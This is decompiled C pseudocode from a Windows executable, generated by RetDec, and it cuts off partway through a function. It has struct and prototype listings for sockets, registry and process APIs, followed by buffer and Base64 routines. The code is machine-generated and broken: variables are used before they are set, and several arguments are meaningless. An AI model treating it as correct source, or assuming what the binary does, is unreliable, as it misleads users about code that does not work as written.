//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <ctype.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <windows.h>

// ----------------- Float Types Definitions ------------------

typedef double float64_t;

// ------------------------ Structures ------------------------

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _IO_FILE {
    int32_t e0;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _OSVERSIONINFOA {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    char e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _PROCESS_INFORMATION {
    int32_t * e0;
    int32_t * e1;
    int32_t e2;
    int32_t e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _WIN32_FIND_DATAA {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    char e8[1];
    char e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tm {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    char * e10;
};

// ------------------------- Classes --------------------------

// .?AVtype_info@@

// ------------------- Function Prototypes --------------------

int32_t ??1?$_Mpunct@D@std@@MAE@XZ(void);
int32_t ??1?$_Mpunct@D@std@@MAE@XZ2(void);
int32_t ??1?$_Mpunct@D@std@@MAE@XZ3(void);
int32_t ??1?$_Mpunct@D@std@@MAE@XZ4(void);
int32_t ??1?$_Mpunct@D@std@@MAE@XZ5(void);
int32_t ??1?$_Mpunct@D@std@@MAE@XZ6(void);
int32_t ??1type_info@@UAE@XZ(void);
int32_t ??3@YAXPAX@Z(int32_t * a1);
int32_t _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ(void);
int32_t __controlfp(int32_t NewValue, int32_t Mask);
int32_t entry_point(void);
int32_t function_404000(void);
int32_t function_404062(void);
int32_t function_404066(void);
int32_t function_40406a(void);
int32_t function_40406e(void);
int32_t function_404072(uint32_t a1);
int32_t function_4040ba(uint32_t a1);
int32_t function_404102(int32_t a1, int32_t a2);
int32_t function_404149(int32_t a1, int32_t a2);
int32_t function_40416f(int32_t a1, uint32_t a2);
int32_t function_404233(int32_t str);
int32_t function_404256(int32_t a1, int32_t a2);
int32_t function_404373(int32_t str);
int32_t function_404396(int32_t a1, int32_t a2);
int32_t function_4043cd(int32_t a1, int32_t a2);
int32_t function_40441a(int32_t a1, int32_t a2);
int32_t function_404465(int32_t a1, int32_t a2);
int32_t function_4044ae(unsigned char a1);
int32_t function_4044c8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40450f(int32_t a1, int32_t a2);
int32_t function_40454b(int32_t a1);
int32_t function_404562(int32_t a1);
int32_t function_4045eb(int32_t result);
int32_t function_404618(void);
int32_t function_404700(int32_t a1, int32_t a2);
int32_t function_4047af(void);
int32_t function_4047b7(int32_t a1);
int32_t function_4047f3(void);
int32_t function_404814(int32_t a1, int32_t a2);
int32_t function_40486d(int32_t a1);
int32_t function_40486e(int32_t a1);
int32_t function_4048d2(void);
int32_t function_4048e7(void);
int32_t function_404955(int32_t a1, int32_t a2);
int32_t function_4049fb(void);
int32_t function_404a28(int32_t a1);
int32_t function_404a40(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404a99(int32_t a1);
int32_t function_404b10(int32_t a1);
int32_t function_404b28(int32_t a1, int32_t a2);
int32_t function_404bb1(void);
int32_t function_404d43(int32_t a1);
int32_t function_404e11(int32_t a1, int32_t a2);
int32_t function_404f2f(int32_t a1);
int32_t function_404f59(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_405027(int32_t a1);
int32_t function_40505c(uint32_t a1, uint32_t a2);
int32_t function_4050c3(uint32_t a1, int32_t a2);
int32_t function_405148(int32_t a1, int32_t a2);
int32_t function_405187(void);
int32_t function_4051ac(int32_t a1, int32_t a2);
int32_t function_405205(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405235(void);
int32_t function_4052be(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405340(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_4053c6(uint32_t a1);
int32_t function_40541b(void);
int32_t function_40543c(void);
int32_t function_40546c(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40568c(void);
int32_t function_405723(char * str);
int32_t function_4057a5(int32_t a1, int32_t a2);
int32_t function_40585f(void);
int32_t function_405863(int32_t file_path, int32_t str);
int32_t function_405891(void);
int32_t function_4058b2(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4058de(int32_t a1, int32_t a2);
int32_t function_4059b1(void);
int32_t function_405c08(void);
int32_t function_405c16(void);
int32_t function_405cd2(int32_t a1, int32_t a2);
int32_t function_405d09(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405dde(int32_t * a1, char * mode);
int32_t function_405e1e(int32_t * str2, int32_t lpSubKey);
int32_t function_4060cb(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4061fd(int32_t a1, int32_t * str, int32_t a3, int32_t * a4);
int32_t function_4062af(int32_t lpFileName, int32_t a2);
int32_t function_4062ed(void);
int32_t function_40630e(int32_t a1);
int32_t function_406374(int32_t a1);
int32_t function_40668d(void);
int32_t function_406ae8(void);
int32_t function_406b97(int32_t a1);
int32_t function_40730c(void);
int32_t function_40731f(int32_t result, int32_t a2);
int32_t function_407387(void);
int32_t function_4073bc(void);
int32_t function_4073dd(void);
int32_t function_40756d(int32_t a1, int32_t a2);
int32_t function_407598(int32_t a1, int32_t a2);
int32_t function_4075c3(int32_t a1);
int32_t function_4075d4(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407630(int32_t a1, uint32_t a2, int32_t a3);
int32_t function_407861(void);
int32_t function_4078aa(int32_t a1, int32_t a2);
int32_t function_4078ab(void);
int32_t function_4078cc(void);
int32_t function_407910(int32_t a1);
int32_t function_4079c6(int32_t a1, int32_t a2);
int32_t function_407a25(int32_t a1, int32_t a2);
int32_t function_407a61(int32_t a1);
int32_t function_407a83(void);
int32_t function_407aa0(void);
int32_t function_407ad4(int32_t a1);
int32_t function_407af5(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407b1f(int32_t a1);
int32_t function_407c18(void);
int32_t function_407c6e(void);
int32_t function_407fcf(int32_t a1, int32_t str);
int32_t function_407fec(int32_t a1, int32_t host_short);
int32_t function_40808c(void);
int32_t function_4080e2(int32_t str);
int32_t function_408141(int32_t result);
int32_t function_4081c4(int32_t str);
int32_t function_4081e6(void);
int32_t function_4081ea(int32_t a1);
int32_t function_4082a5(int32_t a1);
int32_t function_4082d1(int32_t a1);
int32_t function_40830c(void);
int32_t function_4084ae(void);
int32_t * function_4084d6(int32_t * s, int32_t c, int32_t n);
int32_t function_4084dc(int32_t a1);
int32_t * function_4084e2(int32_t * dest, int32_t * src, int32_t n);
int32_t function_4084e8(char * s);
int32_t * function_4084ee(int32_t * ptr, int32_t size);
int32_t function_4084f4(int32_t * Block);
int32_t * function_4084fa(int32_t size);
void function_408500(int32_t * ptr);
char * function_408506(char * String, int32_t C);
char * function_40850c(char * dest, char * src);
int32_t function_408512(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC);
int32_t function_408520(int32_t result);
int32_t function_408540(int32_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s);
int32_t function_408546(int32_t * ptr, int32_t size, int32_t n, struct _IO_FILE * stream);
int32_t function_40854c(struct _IO_FILE * stream);
struct _IO_FILE * function_408552(char * filename, char * modes);
int32_t function_408558(int32_t a1);
int32_t function_408584(int32_t a1);
int32_t function_408596(int32_t * a1);
void function_4085b8(int32_t * pExceptionObject, int32_t * pThrowInfo);
int32_t function_4085be(void);
int32_t function_4085c4(char ** a1);
char * function_4085ca(char * Ptr);
char * function_4085d0(char * String, int32_t Count);
int32_t * function_4085d6(int32_t * dest, int32_t * src, int32_t n);
int32_t function_4085dc(char * s, char * format, ...);
int32_t function_4085f0(int32_t result);
int32_t function_408620(char * s, struct _IO_FILE * stream);
int32_t function_408626(struct _IO_FILE * stream, int32_t off, int32_t whence);
int32_t function_40862c(struct _IO_FILE * stream);
char * function_408632(char * Str, char * Substr);
float64_t function_408638(int32_t time1, int32_t time0);
int32_t function_40863e(int32_t * timer);
int32_t function_408644(void);
int32_t function_40864a(void);
char * function_408650(char * Str, int32_t C);
int32_t function_408656(void);
char * function_40865c(char * String);
char * function_408662(char * dest, char * src);
void function_408668(int32_t status);
int32_t function_40866e(char * Str1, char * Str2);
char * function_408674(int32_t value, char * str, int32_t radix);
int32_t function_40867a(char * Str1, char * Str2);
int32_t function_408680(char * s, int32_t maxsize, char * format, struct tm * tp);
struct tm * function_408686(int32_t * timer);
int32_t function_40868c(char * nptr);
int32_t function_408692(int32_t c);
int32_t function_408698(char * Str1, char * Str2, int32_t MaxCount);
int32_t function_4087dc(void);
int32_t (*function_4087fc(int32_t (*func)(), void (***pbegin)(), void (***pend)()))();
int32_t function_408808(int32_t xcptnum, int32_t * pxcptinfoptrs);
void function_40880e(void (**First)(), void (**Last)());
int32_t function_408826(void);
int32_t function_408829(void);
int32_t function_40882a(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher);
int32_t function_408838(void);
int32_t function_408840(void);
int32_t function_40884c(void);
int32_t function_408854(void);
int32_t function_408860(void);
int32_t function_408868(void);
int32_t function_408874(void);
int32_t function_40887c(void);
int32_t function_408888(void);
int32_t function_408890(void);
int32_t function_40889c(void);
int32_t function_4088a4(void);
int32_t function_4088b0(void);
int32_t function_4088b8(void);
int32_t function_4088c4(void);
int32_t function_4088cc(void);
int32_t function_4088d8(void);
int32_t function_4088e0(void);
int32_t function_4088e8(void);
int32_t function_4088f0(void);
int32_t function_4088f8(void);
int32_t function_408900(void);
int32_t function_408908(void);
int32_t function_408910(void);
int32_t function_40891c(void);
int32_t function_408928(void);
int32_t function_408930(void);
int32_t function_40893c(void);
int32_t function_408944(void);
int32_t function_408950(void);
int32_t function_408958(void);
int32_t function_408964(void);
int32_t function_408970(void);
int32_t function_408978(void);
int32_t function_408980(void);
int32_t function_40898c(void);
int32_t function_408994(void);
int32_t function_40899f(void);
int32_t function_4089a7(void);
int32_t function_4089b4(void);
int32_t function_4089bc(void);
int32_t function_4089c8(void);
int32_t function_4089d0(void);
int32_t function_4089d8(void);
int32_t function_4089e0(void);
int32_t function_4089ec(void);
int32_t function_4089f4(void);
int32_t function_408a00(void);
int32_t function_408a0e(void);
int32_t function_408a18(void);
int32_t function_408a24(void);
int32_t function_408a30(void);
int32_t function_408a38(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x404017; // 0x40c1f0
char * g2; // 0x40c238
int32_t g3 = 0x404a0c; // 0x40c23c
int32_t g4 = 0x404939; // 0x40c248
int32_t g5 = 0x404af4; // 0x40c258
int32_t g6 = 0x405449; // 0x40c264
int32_t g7 = 0x4058bb; // 0x40c268
int32_t g8 = 0x4078e9; // 0x40c280
int32_t g9 = 0x407c30; // 0x40c284
int32_t g10 = 0; // 0x40c380
int32_t g11 = 0; // 0x40c4a8
int32_t g12 = 0; // 0x40c660
char * g13; // 0x40c780
void (**g14)() = NULL; // 0x410000
void (**g15)() = NULL; // 0x410020
void (**g16)() = NULL; // 0x410024
void (**g17)() = NULL; // 0x410028
char g18 = 92; // 0x410130
char g19[2] = "a"; // 0x410570
int32_t g20 = 119; // 0x410740
char g21[2] = "?"; // 0x410b5c
char g22[2] = "@"; // 0x410b60
int32_t g23 = 32; // 0x410b8c
int32_t g24 = 1; // 0x410fe0
char * g25; // 0x410fe8
char g26 = 0; // 0x411025
char g27 = 0; // 0x4110a5
int32_t g28 = 0; // 0x4110e8
char * g29; // 0x4110ec
int32_t g30 = 0; // 0x4110f0
char g31 = 0; // 0x4110f4
int32_t g32 = 0; // 0x4110f8
int32_t g33 = 0; // 0x4110fc
int16_t g34 = 0; // 0x411102
int16_t g35 = 0; // 0x411104
int16_t g36 = 0; // 0x411106
int32_t g37 = 0; // 0x41110c
int32_t g38 = 0; // 0x411110
int32_t g39 = 0; // 0x411114
int32_t g40 = 0; // 0x411118
int32_t g41 = 0; // 0x41111c
int32_t g42 = 0; // 0x411120
int32_t g43 = 0; // 0x411124
int32_t g44 = 0; // 0x411128
int32_t g45 = 0; // 0x41112c
int32_t g46 = 0; // 0x411130
int32_t g47 = 0; // 0x411134
char * g48; // 0x411238
int32_t g49 = 0; // 0x41133c
int32_t g50 = 0; // 0x411340
int32_t g51 = 0; // 0x411344
int32_t g52 = 0; // 0x411348
char g53 = 0; // 0x41134c
int32_t g54 = 0; // 0x411350
void (***g55)() = NULL; // 0x411354
void (***g56)() = NULL; // 0x411358
int32_t g57;

// ------------------------ Functions -------------------------

// Address range: 0x404000 - 0x404017
int32_t function_404000(void) {
    // 0x404000
    int32_t result; // 0x404000
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)result = (int32_t)&g1;
    return result;
}

// Address range: 0x404033 - 0x404062
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ(void) {
    // 0x404033
    int32_t v1; // 0x404033
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x404036
    int32_t v3 = *v2; // 0x404036
    *(int32_t *)v1 = (int32_t)&g1;
    if (v3 != 0) {
        // 0x404043
        _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v3);
        *v2 = 0;
    }
    int32_t * v4 = (int32_t *)(v1 + 8); // 0x40404e
    int32_t v5 = *v4; // 0x40404e
    int32_t result = 0; // 0x404053
    if (v5 != 0) {
        // 0x404055
        result = _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v5);
        *v4 = 0;
    }
    // 0x404060
    return result;
}

// Address range: 0x404062 - 0x404066
int32_t function_404062(void) {
    // 0x404062
    int32_t v1; // 0x404062
    return *(int32_t *)(v1 + 4);
}

// Address range: 0x404066 - 0x40406a
int32_t function_404066(void) {
    // 0x404066
    int32_t v1; // 0x404066
    return *(int32_t *)(v1 + 8);
}

// Address range: 0x40406a - 0x40406e
int32_t function_40406a(void) {
    // 0x40406a
    int32_t v1; // 0x40406a
    return *(int32_t *)(v1 + 20);
}

// Address range: 0x40406e - 0x404072
int32_t function_40406e(void) {
    // 0x40406e
    int32_t v1; // 0x40406e
    return *(int32_t *)(v1 + 24);
}

// Address range: 0x404072 - 0x4040ba
int32_t function_404072(uint32_t a1) {
    // 0x404072
    int32_t v1; // 0x404072
    int32_t * v2 = (int32_t *)(v1 + 16); // 0x40407a
    uint32_t v3 = *v2; // 0x40407a
    int32_t * v4 = (int32_t *)(v1 + 8);
    int32_t v5 = *v4;
    int32_t * set_mem; // 0x4040a9
    if (v3 >= a1) {
        // 0x4040a1
        set_mem = memset((int32_t *)v5, 0, v3);
        *(int32_t *)(v1 + 24) = 0;
        return (int32_t)set_mem;
    }
    if (v5 != 0) {
        // 0x404086
        _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v5);
    }
    int32_t v6 = a1 + 0x1000 & -0x1000; // 0x404091
    *v2 = v6;
    int32_t v7 = _3f__3f_2_40_YAPAXI_40_Z(v6); // 0x404098
    *v4 = v7;
    // 0x4040a1
    set_mem = memset((int32_t *)v7, 0, *v2);
    *(int32_t *)(v1 + 24) = 0;
    return (int32_t)set_mem;
}

// Address range: 0x4040ba - 0x404102
int32_t function_4040ba(uint32_t a1) {
    // 0x4040ba
    int32_t v1; // 0x4040ba
    int32_t * v2 = (int32_t *)(v1 + 12); // 0x4040c2
    uint32_t v3 = *v2; // 0x4040c2
    int32_t * v4 = (int32_t *)(v1 + 4);
    int32_t v5 = *v4;
    int32_t * set_mem; // 0x4040f1
    if (v3 >= a1) {
        // 0x4040e9
        set_mem = memset((int32_t *)v5, 0, v3);
        *(int32_t *)(v1 + 20) = 0;
        return (int32_t)set_mem;
    }
    if (v5 != 0) {
        // 0x4040ce
        _3f__3f_3_40_YAXPAX_40_Z((int32_t *)v5);
    }
    int32_t v6 = a1 + 0x1000 & -0x1000; // 0x4040d9
    *v2 = v6;
    int32_t v7 = _3f__3f_2_40_YAPAXI_40_Z(v6); // 0x4040e0
    *v4 = v7;
    // 0x4040e9
    set_mem = memset((int32_t *)v7, 0, *v2);
    *(int32_t *)(v1 + 20) = 0;
    return (int32_t)set_mem;
}

// Address range: 0x404102 - 0x404149
int32_t function_404102(int32_t a1, int32_t a2) {
    // 0x404102
    if (a1 == 0) {
        // 0x404144
        int32_t result; // 0x404102
        return result;
    }
    // 0x404117
    int32_t v1; // 0x404102
    int32_t * v2 = (int32_t *)(v1 + 24);
    int32_t v3 = 0; // 0x404117
    int32_t v4; // bp-16, 0x404102
    int32_t v5 = &v4; // 0x404117
    int32_t * v6 = (int32_t *)(v5 + 16); // 0x404118
    char * v7 = (char *)(*v6 + v3); // 0x40411c
    int32_t v8; // 0x404102
    int32_t v9 = v8 & -256 | (int32_t)*v7; // 0x40411c
    v5 -= 4;
    *(int32_t *)v5 = v9;
    int32_t result2 = v9; // 0x40412c
    int32_t v10; // 0x404102
    int32_t v11; // 0x404131
    if (v9 == 0) {
        // 0x40412e
        result2 = *(int32_t *)(v1 + 8);
        v11 = *v2;
        *(char *)(v11 + result2) = *v7;
        *v2 = *v2 + 1;
        v10 = v11;
    }
    // 0x40413c
    v3++;
    while (v3 < *v6) {
        // 0x404118
        v6 = (int32_t *)(v5 + 16);
        v7 = (char *)(*v6 + v3);
        v9 = v10 & -256 | (int32_t)*v7;
        v5 -= 4;
        *(int32_t *)v5 = v9;
        result2 = v9;
        if (v9 == 0) {
            // 0x40412e
            result2 = *(int32_t *)(v1 + 8);
            v11 = *v2;
            *(char *)(v11 + result2) = *v7;
            *v2 = *v2 + 1;
            v10 = v11;
        }
        // 0x40413c
        v3++;
    }
    // 0x404144
    return result2;
}

// Address range: 0x404149 - 0x40416f
int32_t function_404149(int32_t a1, int32_t a2) {
    // 0x404149
    int32_t v1; // 0x404149
    int32_t * dest_mem = memcpy((int32_t *)*(int32_t *)(v1 + 4), (int32_t *)a1, a2); // 0x40415f
    *(int32_t *)(v1 + 20) = a2;
    return (int32_t)dest_mem;
}

// Address range: 0x40416f - 0x404233
int32_t function_40416f(int32_t a1, uint32_t a2) {
    int32_t v1 = 2 * a2; // bp-32, 0x404189
    int32_t v2 = &v1; // 0x404189
    char v3 = 0; // 0x404196
    int32_t v4 = v2; // 0x404196
    int32_t v5; // 0x40416f
    int32_t v6; // bp-12, 0x40416f
    int32_t v7; // 0x40416f
    int32_t v8; // 0x40416f
    if (a2 >= 3) {
        int32_t v9 = &v6; // 0x40419f
        int32_t * v10 = (int32_t *)(v8 + 24);
        char v11 = 0; // 0x4041d4
        int32_t * v12 = (int32_t *)(v2 - 4); // 0x404198
        *v12 = 4;
        int32_t v13 = v2 - 8; // 0x40419d
        int32_t * v14 = (int32_t *)v13; // 0x40419d
        *v14 = 0;
        *(int32_t *)(v2 - 12) = v9;
        memset((int32_t *)v8, (int32_t)&g57, (int32_t)&g57);
        int32_t v15 = v11; // 0x4041ac
        *(int32_t *)(v2 - 16) = 3;
        *(int32_t *)(v2 - 20) = *(int32_t *)(v8 + 4) + v15;
        *(int32_t *)(v2 - 24) = v9;
        memcpy(NULL, &g57, (int32_t)&g57);
        *v12 = *v10 + *(int32_t *)(v8 + 8);
        *v14 = v9;
        v11 += 3;
        *v10 = *v10 + 4;
        int32_t v16 = v15 + 6; // 0x4041df
        int32_t * v17 = (int32_t *)3; // 0x4041e4
        v3 = v11;
        v5 = v16;
        v7 = 3;
        v4 = v13;
        while (v16 <= a2) {
            int32_t v18 = v13;
            v12 = (int32_t *)(v18 - 4);
            *v12 = 4;
            v13 = v18 - 8;
            v14 = (int32_t *)v13;
            *v14 = 0;
            *(int32_t *)(v18 - 12) = v9;
            memset(v17, (int32_t)&g57, (int32_t)&g57);
            v15 = v11;
            *(int32_t *)(v18 - 16) = 3;
            *(int32_t *)(v18 - 20) = *(int32_t *)(v8 + 4) + v15;
            *(int32_t *)(v18 - 24) = v9;
            memcpy(NULL, &g57, (int32_t)&g57);
            *v12 = *v10 + *(int32_t *)(v8 + 8);
            *v14 = v9;
            v11 += 3;
            *v10 = *v10 + 4;
            v16 = v15 + 6;
            v17 = (int32_t *)3;
            v3 = v11;
            v5 = v16;
            v7 = 3;
            v4 = v13;
        }
    }
    uint32_t v19 = (int32_t)v3; // 0x4041e6
    int32_t result = v5; // 0x4041e9
    if (v19 < a2) {
        int32_t * v20 = (int32_t *)(v4 - 4); // 0x4041eb
        *v20 = 4;
        int32_t * v21 = (int32_t *)(v4 - 8); // 0x4041f0
        *v21 = 0;
        int32_t v22 = &v6; // 0x4041f2
        *(int32_t *)(v4 - 12) = v22;
        memset((int32_t *)v7, (int32_t)&g57, (int32_t)&g57);
        *(int32_t *)(v4 - 16) = a2 - v19;
        *(int32_t *)(v4 - 20) = *(int32_t *)(v8 + 4) + v19;
        *(int32_t *)(v4 - 24) = v22;
        memcpy((int32_t *)(int32_t)((char)a2 - v3), &g57, (int32_t)&g57);
        result = *(int32_t *)(v8 + 8);
        int32_t * v23 = (int32_t *)(v8 + 24); // 0x404219
        *v20 = *v23 + result;
        *v21 = v22;
        *v23 = *v23 + 4;
    }
    // 0x40422d
    return result;
}

// Address range: 0x404233 - 0x404256
int32_t function_404233(int32_t str) {
    int32_t len; // 0x404233
    if (str != 0) {
        // 0x40423f
        len = strlen((char *)str);
    }
    // 0x404251
    return len;
}

// Address range: 0x404256 - 0x404373
int32_t function_404256(int32_t a1, int32_t a2) {
    // 0x404256
    int32_t v1; // 0x404256
    if (g28 == 0) {
        // 0x40426a
        int32_t v2; // 0x404256
        int32_t v3; // 0x404256
        int32_t v4; // 0x404256
        int32_t v5; // 0x404256
        function_4044c8(v2, v3, v5, v1, 0x1000000 * v1 / 0x1000000, v4);
    }
    int32_t v6 = a2; // bp-36, 0x40427e
    int32_t v7 = &v6; // 0x40427e
    int32_t * v8 = (int32_t *)(v1 + 24); // 0x404288
    uint32_t v9 = *v8; // 0x404288
    int32_t v10 = v9; // 0x40428c
    int32_t v11 = v7; // 0x40428c
    int32_t v12 = 0; // 0x40428c
    int32_t result; // 0x404256
    int32_t v13; // bp-12, 0x404256
    if (v9 >= 4) {
        int32_t v14 = &v13; // 0x404294
        int32_t * v15 = (int32_t *)(v1 + 20);
        int32_t v16 = 0;
        int32_t * v17 = (int32_t *)(v7 - 4); // 0x40428e
        *v17 = 4;
        int32_t v18 = v7 - 8; // 0x404293
        int32_t * v19 = (int32_t *)v18; // 0x404293
        *v19 = 0;
        *(int32_t *)(v7 - 12) = v14;
        memset(&g57, (int32_t)&g57, (int32_t)&g57);
        unsigned char v20 = *(char *)(*(int32_t *)(v1 + 8) + v16); // 0x4042a5
        char v21 = *(char *)((int32_t)v20 + (int32_t)&g25); // 0x4042a8
        v13 = v21;
        *v17 = *v15 + *(int32_t *)(v1 + 4);
        *v19 = v14;
        *v15 = *v15 + 3;
        int32_t v22 = v16 + 4; // 0x404301
        int32_t v23 = v16 + 8; // 0x404304
        uint32_t v24 = *v8; // 0x404307
        v10 = v24;
        result = v23;
        v11 = v18;
        v12 = v22;
        while (v23 <= v24) {
            // 0x40428e
            v16 = v22;
            int32_t v25 = v18;
            v17 = (int32_t *)(v25 - 4);
            *v17 = 4;
            v18 = v25 - 8;
            v19 = (int32_t *)v18;
            *v19 = 0;
            *(int32_t *)(v25 - 12) = v14;
            memset(&g57, (int32_t)&g57, (int32_t)&g57);
            v20 = *(char *)(*(int32_t *)(v1 + 8) + v16);
            v21 = *(char *)((int32_t)v20 + (int32_t)&g25);
            v13 = v21;
            *v17 = *v15 + *(int32_t *)(v1 + 4);
            *v19 = v14;
            *v15 = *v15 + 3;
            v22 = v16 + 4;
            v23 = v16 + 8;
            v24 = *v8;
            v10 = v24;
            result = v23;
            v11 = v18;
            v12 = v22;
        }
    }
    // 0x40430c
    if (v12 >= v10) {
        // 0x40436c
        return result;
    }
    int32_t * v26 = (int32_t *)(v11 - 4); // 0x404311
    *v26 = 4;
    int32_t * v27 = (int32_t *)(v11 - 8); // 0x404316
    *v27 = 0;
    int32_t v28 = &v13; // 0x404317
    *(int32_t *)(v11 - 12) = v28;
    memset(&g57, (int32_t)&g57, (int32_t)&g57);
    if (v12 < *v8) {
        // 0x40432a
        int32_t v29; // bp-4, 0x404256
        int32_t v30 = (int32_t)&v29 - 8 - v12; // 0x40433b
        for (int32_t i = v12; i < *v8; i++) {
            unsigned char v31 = *(char *)(i + *(int32_t *)(v1 + 8)); // 0x40432d
            char v32 = *(char *)((int32_t)v31 + (int32_t)&g25); // 0x404333
            *(char *)(v30 + i) = v32 != -1 ? v32 : 0;
        }
    }
    int32_t * v33 = (int32_t *)(v1 + 20); // 0x404357
    *v26 = *v33 + *(int32_t *)(v1 + 4);
    *v27 = v28;
    int32_t result2 = *v8 - v12; // 0x404367
    *v33 = *v33 + result2;
    // 0x40436c
    return result2;
}

// Address range: 0x404373 - 0x404396
int32_t function_404373(int32_t str) {
    int32_t len; // 0x404373
    if (str != 0) {
        // 0x40437f
        len = strlen((char *)str);
    }
    // 0x404391
    return len;
}

// Address range: 0x404396 - 0x4043cd
int32_t function_404396(int32_t a1, int32_t a2) {
    int32_t v1 = a2; // 0x4043b5
    int32_t v2 = 3; // 0x4043b5
    int32_t result = 0; // 0x4043b5
    int32_t v3; // bp-12, 0x404396
    char v4 = *(char *)((int32_t)&v3 - a2 + v1); // 0x4043b6
    *(char *)v1 = v4;
    result += (int32_t)(v4 != -1);
    v2--;
    v1++;
    while (v2 != 0) {
        // 0x4043b6
        v4 = *(char *)((int32_t)&v3 - a2 + v1);
        *(char *)v1 = v4;
        result += (int32_t)(v4 != -1);
        v2--;
        v1++;
    }
    // 0x4043c5
    return result;
}

// Address range: 0x4043cd - 0x40441a
// Used cryptographic patterns:
//  - B64EncodeTable (8-bit, little endian)
int32_t function_4043cd(int32_t a1, int32_t a2) {
    int32_t v1 = a2; // 0x4043ee
    int32_t v2 = 4; // 0x4043ee
    int32_t v3; // bp-12, 0x4043cd
    unsigned char v4 = *(char *)((int32_t)&v3 - a2 + v1); // 0x4043ef
    char v5 = *(char *)((int32_t)v4 + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x4043f3
    *(char *)v1 = v5;
    v2--;
    v1++;
    while (v2 != 0) {
        // 0x4043ef
        v4 = *(char *)((int32_t)&v3 - a2 + v1);
        v5 = *(char *)((int32_t)v4 + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
        *(char *)v1 = v5;
        v2--;
        v1++;
    }
    unsigned char v6 = *(char *)(a1 + 4); // 0x4043ff
    if (v6 == 1) {
        // 0x40440b
        *(char *)(a2 + 2) = 61;
    } else {
        int32_t result = (int32_t)v6 - 2; // 0x404406
        if (result != 0) {
            // 0x404413
            return result;
        }
    }
    // 0x40440f
    *(char *)(a2 + 3) = 61;
    // 0x404413
    return 0;
}

// Address range: 0x40441a - 0x404465
int32_t function_40441a(int32_t a1, int32_t a2) {
    char v1 = 4 * *(char *)a2; // 0x404425
    char * v2 = (char *)a1; // 0x404428
    *v2 = v1;
    char * v3 = (char *)(a2 + 1); // 0x40442a
    *v2 = *v3 / 16 & 3 | v1;
